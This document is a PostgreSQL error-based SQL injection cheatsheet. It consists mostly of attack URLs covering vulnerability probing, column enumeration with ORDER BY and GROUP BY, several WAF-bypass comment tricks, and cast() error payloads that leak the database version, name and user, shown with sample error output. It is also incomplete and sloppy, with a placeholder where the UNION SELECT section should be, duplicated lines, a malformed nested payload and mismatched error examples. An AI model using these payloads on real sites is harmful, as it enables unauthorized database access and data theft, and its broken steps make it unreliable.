# PostgreSQL Error Based SQL Injection Cheatsheet
This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the PostgreSQL database by using the SQL error messages to his advantage.

## Detecting the vulnerability

```http://domain.com/index.php?id=1 ```  
Website loads normally

```http://domain.com/index.php?id=1'```  
Error shows up: pg_query(): ```Query failed: ERROR: unterminated quoted string at or near...```

```http://domain.com/index.php?id=1\'```  
Error message shows up again

```http://domain.com/index.php?id=-1)'```  
Error message shows up again

```http://domain.com/index.php?id=1'--```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1'--```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1+--```  
Website might loads successfuly, but it might shows error also

## Retrieving information from database (Method 1)
### Find the number of columns using 'ORDER BY' query

Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using **ORDER BY** query.

```http://domain.com/index.php?id=1' order by 1--```  
This query musn't shows up error, since there is no lower number than 1

  - If the payload shows up error, try setting a negative value:
  ```http://domain.com/index.php?id=-1' order by 1--```  
  This query musn't shows up error, since there is no lower number than 1  
  
    - If the payload shows up error, try removing the quote which might cause SQL error: 
    ```http://domain.com/index.php?id=1 order by 1--```  
    ```http://domain.com/index.php?id=-1 order by 1--```  
    These both queries musn't shows up error.
    
    - If none of payload's didn't work, try the following one:  
    ```http://domain.com/index.php?id=1 GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100```
    Look at the error and search which number reflects.  
    Example: >Query failed: ERROR: the position **4** in GROUP_BY...  
    From the error message, the 4th column is being reflected, which means we can dump that. Now move to the next step.
    
      - If none of payloads didn't work, it is problably a WAF blocking it. Try the following blocks until you won't see WAF detection or SQL syntax error.
      ```http://domain.com/index.php?id=1' order by 1 desc-- -``` 
      ```http://domain.com/index.php?id=1' group by 1-- -```  
      ```http://domain.com/index.php?id=1' group by 1-- -```  
      ```http://domain.com/index.php?id=1' /**/ORDER/**/BY/**/ 1-- -```  
      ```http://domain.com/index.php?id=-1' /*!order*/+/*!by*/ 1-- -```  
      ```http://domain.com/index.php?id=1' /*!ORDER BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1'/*!50000ORDER*//**//*!50000BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1' /*!12345ORDER*/+/*!BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1' order/**_**/by 1-- -```  
      ```http://domain.com/index.php?id=1\ order by 1-- -```  
      ```http://domain.com/index.php?id=1' order by 1 asc-- -```  
      ```http://domain.com/index.php?id=1' group by 1 asc-- -```  
      ```http://domain.com/index.php?id=1' AND 0 order by 1-- -```
      
        - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:

          Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
          Remove the quote (') after the parameter value (example: ```?id=1 /**/ORDER/**/BY/**/ 1-- -```)

In this case, the payload ```?id=1 order by 1-- -``` worked and website loads successfuly. Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up:

```http://domain.com/index.php?id=1 order by 1-- - no error```  
```http://domain.com/index.php?id=1 order by 2-- - no error```  
```http://domain.com/index.php?id=1 order by 3-- - no error```  
```http://domain.com/index.php?id=1 order by 4-- - no error```  
```http://domain.com/index.php?id=1 order by 5-- - error: Query failed: ERROR: ORDER BY position 6 in not in select list...```  

This means there are only 4 columns. Now we have to find which one of these 4 columns have information.

Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without syntax error. NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.

Website must successfully load and we will see a number (in our case between 1-4)

### Dump the vulnerable column

HERE PUT THE PAYLOADS FOR UNION SELECT











## Retrieving information from database (Method 2)

In the second method, we don't need to enumerate the number of columns. We directly begin retrieving information, however it is harder to guess the table names and columns.

```http://domain.com/index.php?1 and 1=cast(version() as int)```  
Inside the error message, the version will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit"** in /home/REDACTED/public_html/index.php on line...

Retrieve the database name:  
```http://domain.com/index.php?id=1 and 1=cast(current_database() as int)```  
Inside the error message, the user will be displayed: 
>Query failed: ERROR: invalid input syntax for integer: **"munivent_database"** in /home/REDACTED/public_html/index.php on line...

Search for table:
```http://domain.com/index.php?id=1 and 1=cast(current_user as int)```  
Inside the error message, the user will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"admin_user"** in /home/REDACTED/public_html/index.php on line...  

Try forcing server to reflect your input:  
```http://domain.com/index.php?id=1 and 1=cast(and 1=cast( CHR(107) || CHR(108) || CHR(101) || CHR(105) || CHR(116) || CHR(111) || CHR(110) || CHR(48) || CHR(120) || CHR(48) || CHR(48) as int)```  
Inside the error message, the input will be reflected:  
>Query failed: ERROR: invalid input syntax for integer: **"kleiton0x00"** in /home/REDACTED/public_html/index.php on line...  

Retrieving multiple information:  
```http://domain.com/index.php?id=1 and 1=cast(current_database() ||":"|| current_user ||":"|| version() as int)```  
Inside the error message, the information will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"munivent_database : admin_user : munivent_database : PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit"** in /home/REDACTED/public_html/index.php on line...  

